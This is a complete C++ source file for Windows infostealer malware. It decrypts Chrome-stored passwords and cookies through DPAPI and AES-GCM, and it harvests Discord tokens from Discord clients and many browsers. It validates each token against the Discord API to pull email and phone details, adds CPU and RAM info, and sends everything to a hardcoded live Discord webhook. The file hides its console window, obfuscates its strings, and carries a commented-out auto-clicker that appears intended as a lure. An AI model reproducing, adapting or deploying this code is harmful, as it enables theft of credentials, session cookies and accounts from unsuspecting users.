
#include <iostream>
#include <atomic>
#include <map>
#include <tuple>
#include <regex>
#include <numeric>
#include <thread>
#include <algorithm>
#include <fstream>
#include <filesystem>
#include <sstream>
#include <string_view>
#include <Windows.h>
#include <wincrypt.h>
#include <cpr/cpr.h>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/gcm.h>
#include <nlohmann/json.hpp>
#include "base64.h"
#include "XorString.h"
#include "cpuinfo.h"
#include <sqlite3.h>
#include <libzippp/libzippp.h>

#define ARR_SIZE(x) sizeof(x) / sizeof(x)[0]

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

class Decryption
{
private:
    Decryption() = delete;
    Decryption(const Decryption &) = delete;
    ~Decryption() = delete;

public:
    static std::string AESGCM(const std::vector<byte> &buffer, const std::vector<byte> &key)
    {
        std::string decrypted;
        std::string decoded_text;

        auto _iv = std::vector<byte>{buffer.cbegin() + 3, buffer.cbegin() + 15};
        auto _payload = std::vector<byte>{buffer.cbegin() + 15, buffer.cend()};

        decoded_text.reserve(_payload.size());
        decoded_text.assign(_payload.cbegin(), _payload.cend());

        CryptoPP::GCM<CryptoPP::AES>::Decryption aesDecryption;
        aesDecryption.SetKeyWithIV(reinterpret_cast<const byte *>(key.data()),
                                   key.size(),
                                   reinterpret_cast<const byte *>(_iv.data()),
                                   _iv.size());

        CryptoPP::AuthenticatedDecryptionFilter df(aesDecryption,
                                                   new CryptoPP::StringSink(decrypted));

        CryptoPP::StringSource(decoded_text, true,
                               new CryptoPP::Redirector(df));

        if (!df.GetLastResult())
            return std::string{};

        return decrypted;
    }

    static std::vector<byte> getMasterKey(const std::string &state_path)
    {
        std::vector<byte> master_key;
        std::ifstream state_file(state_path);
        nlohmann::json local_state = nlohmann::json::parse(state_file);

        if (!local_state.contains("os_crypt") && !local_state["os_crypt"].contains("os_crypt"))
            return master_key;

        std::string enc_key = local_state["os_crypt"]["encrypted_key"];
        std::string dec_key;

        macaron::Base64::Decode(enc_key, dec_key);

        std::vector<byte> decoded_key_bytes{dec_key.cbegin(), dec_key.cend()};
        decoded_key_bytes.push_back('\0');

        decoded_key_bytes.assign(
            decoded_key_bytes.begin() + 5,
            decoded_key_bytes.end());

        DATA_BLOB key_blob;
        key_blob.cbData = decoded_key_bytes.size() + 1;
        key_blob.pbData = (byte *)&decoded_key_bytes[0];

        DATA_BLOB decrypted_blob;
        if (!CryptUnprotectData(
                &key_blob,
                nullptr,
                nullptr,
                nullptr,
                nullptr,
                0,
                &decrypted_blob))
        {
            return std::vector<byte>{};
        }

        master_key.reserve(decrypted_blob.cbData);
        master_key.assign(decrypted_blob.pbData,
                          decrypted_blob.pbData + decrypted_blob.cbData);

        return master_key;
    }
};

class Utils
{
private:
    Utils() = delete;
    Utils(const Utils &) = delete;
    ~Utils() = delete;

public:
    static std::string randomString(const int len)
    {
        srand(time(NULL));

        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        std::string tmp_s;
        tmp_s.reserve(len);

        for (int i = 0; i < len; ++i)
            tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];

        return tmp_s;
    }

    static inline std::string randomTempPath(int len)
    {
        std::string temp = getenv("TEMP");
        return temp + "\\" + randomString(len);
    }

    static inline std::string randomTempPath(int len, const std::string &prefix = "", const std::string &ext = "")
    {
        std::string temp = getenv("TEMP");
        return temp + "\\" + prefix + randomString(len) + ext;
    }

    static std::string compressToFile(const std::string &data, const std::string &name, const std::string &entry_name)
    {
        std::string zip_path = randomTempPath(9, name, ".zip");

        libzippp::ZipArchive zf(zip_path);

        zf.open(libzippp::ZipArchive::OpenMode::New);
        zf.addData(entry_name, data.data(), data.size());
        zf.close();
        std::cout << "zip path: " << zip_path << '\n';

        return zip_path;
    }
};

class ChromeStealer
{
private:
    std::map<std::string, std::string> passwordPaths;
    std::map<std::string, std::string> cookiesPaths;
    std::string localStatePath;
    std::string webhook;

public:
    struct ChromePassword
    {
        ChromePassword(std::string _url, std::string _username, std::string _password) : url(_url), username(_username), password(_password) {}
        std::string url;
        std::string username;
        std::string password;
    };

    struct ChromeCookie
    {
        ChromeCookie(std::string _url, std::string _name, std::string _value, std::string _path, std::string _expires) : url(_url), name(_name), value(_value), path(_path), expires(_expires) {}
        std::string url;
        std::string name;
        std::string value;
        std::string path;
        std::string expires;
    };

    ChromeStealer(std::string _webhook)
    {
        webhook = _webhook;
    }

    const std::string &getStatePath()
    {
        // TODO: make dynamic for different chromium based browsers
        if (!localStatePath.empty())
            return localStatePath;

        std::string local = getenv("LOCALAPPDATA");
        localStatePath = local + XorStr("\\Google\\Chrome\\User Data\\Local State");

        return localStatePath;
    }

    const std::map<std::string, std::string> &getPassowrdPaths()
    {
        if (!passwordPaths.empty())
        {
            return passwordPaths;
        }

        std::string local = getenv("LOCALAPPDATA");

        passwordPaths["Chrome"] = local + XorStr("\\Google\\Chrome\\User Data\\Default\\Login Data");
        passwordPaths["Chrome1"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 1\\Login Data");
        passwordPaths["Chrome2"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 2\\Login Data");
        passwordPaths["Chrome3"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 3\\Login Data");
        passwordPaths["Chrome4"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 4\\Login Data");
        passwordPaths["Chrome5"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 5\\Login Data");

        return passwordPaths;
    }

    const std::map<std::string, std::string> &getCookiesPaths()
    {
        if (!cookiesPaths.empty())
        {
            return cookiesPaths;
        }

        std::string local = getenv("LOCALAPPDATA");

        cookiesPaths["Chrome"] = local + XorStr("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
        cookiesPaths["Chrome1"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies");
        cookiesPaths["Chrome2"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 2\\Network\\Cookies");
        cookiesPaths["Chrome3"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 3\\Network\\Cookies");
        cookiesPaths["Chrome4"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 4\\Network\\Cookies");
        cookiesPaths["Chrome5"] = local + XorStr("\\Google\\Chrome\\User Data\\Profile 5\\Network\\Cookies");

        return cookiesPaths;
    }

    std::vector<ChromePassword> getPasswords(const std::string_view &path, const std::vector<byte> &master_key)
    {
        std::string temp = getenv("TEMP");
        std::string target_fn = temp + "\\" + randomString(6);

        if (!std::filesystem::copy_file(path, target_fn))
        {
            return std::vector<ChromePassword>{};
        }

        sqlite3 *db;
        int rc = sqlite3_open(target_fn.c_str(), &db);
        if (rc)
        {
            sqlite3_close(db);
        }

        std::string sql = XorStr("SELECT origin_url, username_value, password_value FROM logins");

        sqlite3_stmt *pStmt;
        rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
        if (rc != SQLITE_OK)
        {
            sqlite3_close(db);
            return std::vector<ChromePassword>{};
        }

        std::vector<ChromePassword> ret;
        std::string next_url, next_username, next_password;

        rc = sqlite3_step(pStmt);
        while (rc == SQLITE_ROW)
        {
            int size = sqlite3_column_bytes(pStmt, 2);
            const byte *data = (const byte *)sqlite3_column_blob(pStmt, 2);

            std::vector<byte> buffer;
            buffer.reserve(size);
            buffer.assign(data, data + size);

            next_password = Decryption::AESGCM(buffer, master_key);
            if (!next_password.empty())
            {
                next_url = (char *)sqlite3_column_text(pStmt, 0);
                next_username = (char *)sqlite3_column_text(pStmt, 1);

                ret.push_back(ChromePassword{next_url, next_username, next_password});

                next_url.clear();
                next_username.clear();
            }

            next_password.clear();

            rc = sqlite3_step(pStmt);
        }
        rc = sqlite3_finalize(pStmt);
        sqlite3_close(db);

        std::filesystem::remove(target_fn);

        return ret;
    }

    std::vector<ChromeCookie> getCookies(const std::string_view &path, const std::vector<byte> &master_key)
    {
        std::string temp = getenv("TEMP");
        std::string target_fn = temp + "\\" + randomString(6);
        if (!std::filesystem::copy_file(path, target_fn))
        {
            return std::vector<ChromeCookie>{};
        }

        sqlite3 *db;
        int rc = sqlite3_open(target_fn.c_str(), &db);
        if (rc)
        {
            sqlite3_close(db);
        }

        std::string sql = XorStr("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");

        sqlite3_stmt *pStmt;
        rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
        if (rc != SQLITE_OK)
        {
            return std::vector<ChromeCookie>{};
        }

        std::vector<ChromeCookie> ret;
        std::string next_url, next_name, next_value, next_path, next_expires;

        rc = sqlite3_step(pStmt);
        while (rc == SQLITE_ROW)
        {
            int size = sqlite3_column_bytes(pStmt, 3);
            const byte *data = (const byte *)sqlite3_column_blob(pStmt, 3);

            std::vector<byte> buffer;
            buffer.reserve(size);
            buffer.assign(data, data + size);

            next_value = Decryption::AESGCM(buffer, master_key);
            if (!next_value.empty())
            {
                next_url = (char *)sqlite3_column_text(pStmt, 0);
                next_name = (char *)sqlite3_column_text(pStmt, 1);
                next_path = (char *)sqlite3_column_text(pStmt, 2);
                next_expires = (char *)sqlite3_column_text(pStmt, 4);

                ret.push_back(ChromeCookie{next_url, next_name, next_value, next_path, next_expires});

                next_url.clear();
                next_name.clear();
                next_path.clear();
                next_expires.clear();
            }

            next_value.clear();

            rc = sqlite3_step(pStmt);
        }
        rc = sqlite3_finalize(pStmt);
        sqlite3_close(db);

        std::filesystem::remove(target_fn);

        return ret;
    }

    void searchForPasswords(const std::pair<std::string, std::string> &browser)
    {
        std::string_view name = browser.first;
        std::string_view path = browser.second;
        const std::string &state_path = getStatePath();

        if (!std::filesystem::exists(state_path) ||
            !std::filesystem::exists(path))
            return;

        std::vector<byte> master_key = Decryption::getMasterKey(state_path);
        if (master_key.empty())
            return;

        auto passwords = getPasswords(path, master_key);

        if (passwords.empty())
            return;

        std::stringstream passwords_stream;
        for (const auto &password : passwords)
            passwords_stream << "URL: " << password.url << ", USERNAME: " << password.username
                             << ", PASSWORD: " << password.password << '\n';

        std::string compressed_path = Utils::compressToFile(passwords_stream.str(), browser.first + ".P.", browser.first + " passwords.txt");

        cpr::Header headers;
        headers["Content-Type"] = "multipart/form-data";

        nlohmann::json json;
        json["content"] = std::string{name} + " passwords";

        cpr::Response resp = cpr::Post(cpr::Url{webhook}, headers, cpr::Body{json.dump()}, cpr::Multipart{{"passwords", cpr::File{compressed_path}}});

        remove(compressed_path.c_str());
    }

    void searchForCookies(const std::pair<std::string, std::string> &browser)
    {
        std::string_view name = browser.first;
        std::string_view path = browser.second;
        const std::string &state_path = getStatePath();

        if (!std::filesystem::exists(state_path) ||
            !std::filesystem::exists(path))
            return;

        std::vector<byte> master_key = Decryption::getMasterKey(state_path);
        if (master_key.empty())
            return;

        auto cookies = getCookies(path, master_key);

        if (cookies.empty())
            return;

        std::stringstream cookies_stream;
        for (const auto &cookie : cookies)
            cookies_stream << "URL: " << cookie.url << ", NAME: " << cookie.name
                           << ", VALUE: " << cookie.value << ", PATH: " << cookie.path
                           << ", EXPIRES: " << cookie.expires << '\n';

        std::string compressed_path = Utils::compressToFile(cookies_stream.str(), browser.first + ".C.", browser.first + " cookies.txt");

        cpr::Header headers;
        headers["Content-Type"] = "multipart/form-data";

        nlohmann::json json;
        json["content"] = std::string{name} + " cookies";

        cpr::Response resp = cpr::Post(cpr::Url{webhook}, headers, cpr::Body{json.dump()}, cpr::Multipart{{"cookies", cpr::File{compressed_path}}});

        remove(compressed_path.c_str());
    }
    /*
    void searchForCredentials(const std::string &browser, const std::string &passwords_path, const std::string &cookies_path)
    {
        const std::string &state_path = getStatePath();

        if (!std::filesystem::exists(state_path))
            return;

        std::vector<byte> master_key = Decryption::getMasterKey(state_path);
        if (master_key.empty())
            return;


        if (std::filesystem::exists(passwords_path))
        {
            auto passwords = getPasswords(passwords_path, master_key);
            for (const auto &password : passwords)
                std::cout << "URL: " << password.url << ", Username: " << password.username << ", Password: " << password.password << '\n';
        }

        if (std::filesystem::exists(cookies_path))
        {
            auto cookies = getCookies(cookies_path, master_key);
            for (const auto &cookie : cookies)
                std::cout << "URL: " << cookie.url << ", Name: " << cookie.name
                          << ", Value: " << cookie.value << ", Path: " << cookie.path
                          << ", Expires: " << cookie.expires << '\n';
        }
    }
    */

    void grab()
    {
        const auto &paths = getPassowrdPaths();
        for (const auto &browser : paths)
        {
            searchForPasswords(browser);
        }

        const auto &cPaths = getCookiesPaths();
        for (const auto &browser : cPaths)
        {
            searchForCookies(browser);
        }
    }
    // TODO: get history
private:
    std::string randomString(const int len)
    {
        srand(time(NULL));

        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        std::string tmp_s;
        tmp_s.reserve(len);

        for (int i = 0; i < len; ++i)
            tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];

        return tmp_s;
    }
};

class TokenGrabber
{
private:
    std::regex token_regexp;
    std::regex token_regexp_enc;

    std::string webhook;
    std::map<std::string, std::vector<byte>> master_keys;
    std::map<std::string, std::string> paths;
    std::map<std::string, std::vector<std::string>> tokens;
    std::vector<std::string> sent_tokens;

    bool done;

public:
    TokenGrabber(std::string webhook)
    {
        this->webhook = webhook;

        token_regexp.assign(XorStr(R"=([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})="));
        token_regexp_enc.assign(XorStr("dQw4w9WgXcQ:[^\"]*"));

        done = false;
    }

    const std::map<std::string, std::string> &getPaths()
    {
        if (!paths.empty())
            return paths;

        std::string roaming = getenv(XorStr("APPDATA"));
        std::string appdata = getenv(XorStr("LOCALAPPDATA"));

        std::string discord = roaming + XorStr("\\discord\\");
        std::string discord_canary = roaming + XorStr("\\discordcanary\\");
        std::string lightcord = roaming + XorStr("\\Lightcord\\");
        std::string discord_ptb = roaming + XorStr("\\discordptb\\");
        std::string opera = roaming + XorStr("\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
        std::string opera_gx = roaming + XorStr("\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
        std::string amigo = appdata + XorStr("\\Amigo\\User Data\\Local Storage\\leveldb\\");
        std::string torch = appdata + XorStr("\\Torch\\User Data\\Local Storage\\leveldb\\");
        std::string kometa = appdata + XorStr("\\Kometa\\User Data\\Local Storage\\leveldb\\");
        std::string orbitum = appdata + XorStr("\\Orbitum\\User Data\\Local Storage\\leveldb\\");
        std::string centbrowser = appdata + XorStr("\\CentBrowser\\User Data\\Local Storage\\leveldb\\");
        std::string seven_star = appdata + XorStr("\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\");
        std::string sputnik = appdata + XorStr("\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\");
        std::string vivaldi = appdata + XorStr("\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\");
        std::string chrome_sxs = appdata + ("\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
        std::string chrome = appdata + XorStr("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
        std::string chrome1 = appdata + XorStr("\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\");
        std::string chrome2 = appdata + XorStr("\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\");
        std::string chrome3 = appdata + XorStr("\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\");
        std::string chrome4 = appdata + XorStr("\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\");
        std::string chrome5 = appdata + XorStr("\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\");
        std::string epic_privacy_browser = appdata + XorStr("\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\");
        std::string microsoft_edge = appdata + XorStr("\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\");
        std::string uran = appdata + XorStr("\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\");
        std::string yandex = appdata + XorStr("\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\");
        std::string brave = appdata + XorStr("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\");
        std::string iridium = appdata + XorStr("\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\");

        paths["Discord"] = discord;
        paths["Discord Canary"] = discord_canary;
        paths["Lightcord"] = lightcord;
        paths["Discord PTB"] = discord_ptb;
        paths["Opera"] = opera;
        paths["Opera GX"] = opera_gx;
        paths["Amigo"] = amigo;
        paths["Torch"] = torch;
        paths["Kometa"] = kometa;
        paths["Orbitum"] = orbitum;
        paths["CentBrowser"] = centbrowser;
        paths["7Star"] = seven_star;
        paths["Sputnik"] = sputnik;
        paths["Vivaldi"] = vivaldi;
        paths["Chrome SxS"] = chrome_sxs;
        paths["Chrome"] = chrome;
        paths["Chrome1"] = chrome1;
        paths["Chrome2"] = chrome2;
        paths["Chrome3"] = chrome3;
        paths["Chrome4"] = chrome4;
        paths["Chrome5"] = chrome5;
        paths["Epic Privacy Browser"] = epic_privacy_browser;
        paths["Microsoft Edge"] = microsoft_edge;
        paths["Uran"] = uran;
        paths["Yandex"] = yandex;
        paths["Brave"] = brave;
        paths["Iridium"] = iridium;

        return paths;
    }

    const std::vector<byte> &getMasterKey(const std::string &state_path)
    {
        if (master_keys.find(state_path) != master_keys.end())
        {
            return master_keys[state_path];
        }

        std::vector<byte> master_key;
        std::ifstream state_file(state_path);
        nlohmann::json local_state = nlohmann::json::parse(state_file);

        if (!local_state.contains("os_crypt") && !local_state["os_crypt"].contains("os_crypt"))
            return master_key;

        std::string enc_key = local_state["os_crypt"]["encrypted_key"];
        std::string dec_key;

        macaron::Base64::Decode(enc_key, dec_key);

        std::vector<byte> decoded_key_bytes{dec_key.cbegin(), dec_key.cend()};
        decoded_key_bytes.push_back('\0');

        decoded_key_bytes.assign(
            decoded_key_bytes.begin() + 5,
            decoded_key_bytes.end());

        DATA_BLOB key_blob;
        key_blob.cbData = decoded_key_bytes.size() + 1;
        key_blob.pbData = (byte *)&decoded_key_bytes[0];

        DATA_BLOB decrypted_blob;
        if (!CryptUnprotectData(
                &key_blob,
                nullptr,
                nullptr,
                nullptr,
                nullptr,
                0,
                &decrypted_blob))
        {
            return std::vector<byte>{};
        }

        master_key.reserve(decrypted_blob.cbData);
        master_key.assign(decrypted_blob.pbData,
                          decrypted_blob.pbData + decrypted_blob.cbData);
        master_keys[state_path] = master_key;

        return master_keys[state_path];
    }

    std::string decryptToken(const std::vector<byte> &buffer, const std::vector<byte> &key)
    {
        std::string decrypted;
        std::string decoded_text;

        auto _iv = std::vector<byte>{buffer.cbegin() + 3, buffer.cbegin() + 15};
        auto _payload = std::vector<byte>{buffer.cbegin() + 15, buffer.cend()};

        decoded_text.reserve(_payload.size());
        decoded_text.assign(_payload.cbegin(), _payload.cend());

        CryptoPP::GCM<CryptoPP::AES>::Decryption aesDecryption;
        aesDecryption.SetKeyWithIV(reinterpret_cast<const byte *>(key.data()),
                                   key.size(),
                                   reinterpret_cast<const byte *>(_iv.data()),
                                   _iv.size());

        CryptoPP::AuthenticatedDecryptionFilter df(aesDecryption,
                                                   new CryptoPP::StringSink(decrypted));

        CryptoPP::StringSource(decoded_text, true,
                               new CryptoPP::Redirector(df));

        if (!df.GetLastResult())
            return std::string{};

        return decrypted;
    }

    std::vector<std::string> searchDiscord(const std::string_view &state_path, const std::string_view &storage_dir)
    {
        const std::vector<byte> &master_key = getMasterKey(std::string{state_path});

        if (master_key.empty())
            return std::vector<std::string>{};

        std::vector<std::string> tokens{};
        for (const auto &path : std::filesystem::directory_iterator{storage_dir})
        {
            std::string file_path = path.path().u8string();
            if (endsWith(file_path, ".log") || endsWith(file_path, ".ldb"))
            {
                // took me hours to figure out that I need to read binary smh
                std::ifstream db_file(file_path, std::ios_base::binary);
                std::string content;

                db_file.seekg(0, std::ios::end);
                content.reserve(db_file.tellg());
                db_file.seekg(0, std::ios::beg);

                content.assign((std::istreambuf_iterator<char>(db_file)),
                               std::istreambuf_iterator<char>());

                std::sregex_iterator match_begin{content.begin(), content.end(), token_regexp_enc};
                std::sregex_iterator match_end{};

                for (std::sregex_iterator i = match_begin; i != match_end; ++i)
                {
                    std::string dec_match_str;
                    std::string match_string = i->str().substr(12);

                    macaron::Base64::Decode(match_string, dec_match_str);
                    std::vector<byte> buffer{dec_match_str.cbegin(), dec_match_str.cend()};

                    std::string token = decryptToken(buffer, master_key);
                    if (token.empty())
                        continue;

                    tokens.push_back(token);
                }
            }
        }

        return tokens;
    }

    std::vector<std::string> searchBrowser(const std::string_view &storage_dir)
    {
        std::vector<std::string> tokens{};
        for (const auto &path : std::filesystem::directory_iterator{storage_dir})
        {
            std::string file_path = path.path().u8string();
            if (endsWith(file_path, ".log") || endsWith(file_path, ".ldb"))
            {
                std::ifstream db_file(file_path, std::ios_base::binary);
                std::string content;

                db_file.seekg(0, std::ios::end);
                content.reserve(db_file.tellg());
                db_file.seekg(0, std::ios::beg);

                content.assign((std::istreambuf_iterator<char>(db_file)),
                               std::istreambuf_iterator<char>());

                std::sregex_iterator match_begin{content.begin(), content.end(), token_regexp};
                std::sregex_iterator match_end{};

                for (std::sregex_iterator i = match_begin; i != match_end; ++i)
                {
                    std::string token = i->str();
                    tokens.push_back(token);
                }
            }
        }

        return tokens;
    }

    void searchPath(const std::pair<std::string, std::string> &discord)
    {
        std::vector<std::string> grabbed_tokens;
        std::string_view name = discord.first;
        std::string_view root_path = discord.second;

        if (isDiscord(root_path))
        {
            std::string local_state = std::string{root_path} + XorStr("Local State");
            if (!std::filesystem::exists(local_state))
                return;

            std::string storage_path = std::string{root_path} + XorStr("Local Storage\\leveldb\\");
            grabbed_tokens = searchDiscord(local_state, storage_path);
        }
        else
        {
            grabbed_tokens = searchBrowser(root_path);
        }

        if (!grabbed_tokens.empty())
        {
            tokens[discord.first] = grabbed_tokens;

            for (const auto &token : grabbed_tokens)
            {
                if (std::find(sent_tokens.begin(), sent_tokens.end(), token) != sent_tokens.end())
                    continue;

                std::string avatar;
                std::string account_info = validateToken(token, avatar);

                if (account_info.empty())
                    continue;

                nlohmann::json embed;
                embed["title"] = "TOKEN GRAB";
                embed["thumbnail"] = nlohmann::json{{"url", avatar}};
                embed["fields"] = nlohmann::json::array({nlohmann::json{{"name", discord.first}, {"value", "```" + token + "```"}},
                                                         nlohmann::json{{"name", "Account Info"}, {"value", account_info}}});

                nlohmann::json json;
                json["embeds"] = nlohmann::json::array({embed});

                if (post(json.dump()))
                {
                    sent_tokens.push_back(token);
                }
            }
        }
    }

    std::string validateToken(const std::string_view &token, std::string &avatar)
    {
        cpr::Header headers;
        headers["Authorization"] = token;

        cpr::Response resp = cpr::Get(cpr::Url{XorStr("https://discord.com/api/v9/users/@me")}, headers);

        if (resp.status_code != 200)
            return std::string{};

        auto premium_type_to_string = [](int type) -> std::string
        {
            return !type ? "None" : type == 1 ? "Nitro Classic"
                                : type == 2   ? "Nitro"
                                : type == 3   ? "Nitro Basic"
                                              : "No Idea";
        };

        nlohmann::json json = nlohmann::json::parse(resp.text);

        std::stringstream ret;
        std::string id = json["id"];
        std::string username = json["username"];
        std::string discriminator = json["discriminator"];
        std::string avatar_hash = json["avatar"];

        ret << ":bust_in_silhouette: Username: " << username << "#" << discriminator << '\n';
        ret << ":e_mail: Email: " << json["email"].dump() << '\n';
        ret << ":mobile_phone: Phone: " << json["phone"].dump() << '\n';
        ret << ":fire: Nitro: " << premium_type_to_string(json["premium_type"]) << '\n';
        ret << ":globe_with_meridians: Locale: " << json["locale"].dump() << '\n';

        avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatar_hash + ".webp";

        return ret.str();
    }

    bool post(const std::string &json)
    {
        cpr::Header headers;
        headers["Content-Type"] = "application/json";

        cpr::Response resp = cpr::Post(cpr::Url{webhook}, cpr::Body{json}, headers);
        return resp.status_code == 204;
    }

    std::string getCPUInfo()
    {
        std::stringstream ret;
        cpuinfo::CPUInfo cinfo;

        ret << "```\n";
        ret << "CPU: " << cinfo.model() << '\n';
        ret << "Cores: " << cinfo.cores() << '\n';
        ret << "Threads: " << cinfo.logicalCpus() << '\n';
        ret << "```";

        return ret.str();
    }

    std::string getRAMInfo()
    {
        MEMORYSTATUSEX statex;
        statex.dwLength = sizeof(statex);

        GlobalMemoryStatusEx(&statex);

        std::stringstream ret;

        ret << "```\n";
        ret << "Usage: " << statex.dwMemoryLoad << "%\n";
        ret << "Amount: " << round(statex.ullTotalPhys / 1024 / 1e+6) << "GB\n";
        ret << "```";

        return ret.str();
    }

    std::string getGPUInfo()
    {
        // TODO: get GPU info
        std::stringstream ret;
        ret << "```\n";
        ret << "will implement soon\n";
        ret << "```";

        return ret.str();
    }

    void grab()
    {
        nlohmann::json embed;
        embed["title"] = "System Info";
        embed["fields"] = nlohmann::json::array({
            nlohmann::json{{"name", "CPU"}, {"value", getCPUInfo()}},
            nlohmann::json{{"name", "RAM"}, {"value", getRAMInfo()}},
            nlohmann::json{{"name", "GPU"}, {"value", getGPUInfo()}},
        });

        nlohmann::json json;
        json["embeds"] = nlohmann::json::array({embed});

        post(json.dump());

        const auto &paths = getPaths();
        for (const auto &discord_client : paths)
        {
            if (!std::filesystem::exists(discord_client.second))
                continue;

            searchPath(discord_client);
        }

        done = true;
    }

    inline const bool isDone() const
    {
        return done;
    }

    inline bool hasTokens() const
    {
        return !tokens.empty();
    }

    inline const std::map<std::string, std::vector<std::string>> &getTokens() const
    {
        return tokens;
    }

    inline std::vector<std::string> getTokens(const std::string &discord)
    {
        if (tokens.find(discord) != tokens.end())
            return tokens[discord];

        return std::vector<std::string>{};
    }

private:
    inline bool endsWith(const std::string_view &source, const std::string_view &ending)
    {
        return (source.length() >= ending.length()) ? (0 == source.compare(source.length() - ending.length(), ending.length(), ending)) : false;
    }

    inline bool isDiscord(const std::string_view &path)
    {
        return path.find("cord") != std::string::npos;
    }
};

void autoClicker()
{
    MessageBoxA(NULL, "Press Enter to start/stop clicking\nPress Esc to exit", "auto clicker", MB_ICONINFORMATION);

    POINT cursor;
    bool clicking = false;

    while (true)
    {
        if (GetAsyncKeyState(VK_BACK))
        {
            MessageBoxA(NULL, "Exiting...", "auto clicker", MB_ICONINFORMATION);
            return;
        }
        else if (GetAsyncKeyState(VK_RETURN))
        {
            if (clicking)
            {
                clicking = false;
                Sleep(500);
                continue;
            }

            clicking = true;
            Sleep(500);
        }

        if (clicking)
        {
            GetCursorPos(&cursor);
            mouse_event(MOUSEEVENTF_LEFTDOWN, cursor.x, cursor.y, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, cursor.x, cursor.y, 0, 0);
        }
    }
}

int main()
{
    const std::string WEBHOOK = XorStr("https://discord.com/api/webhooks/1102591413616656554/x9-LO3o1_BJh4UzpiFoYxsQ9G47f5HDvJ5mIjTFXlt0ZeDn_tt3m73ytl_RZF1Zr9opl");
    std::thread search_thread{
        [&]()
        {
            TokenGrabber grabber{WEBHOOK};
            grabber.grab();
        }};

    std::thread search_thread2{
        [&]()
        {
            ChromeStealer stealer{WEBHOOK};
            stealer.grab();
        }};

    // autoClicker();
    search_thread.join();
    search_thread2.join();

    return 0;
}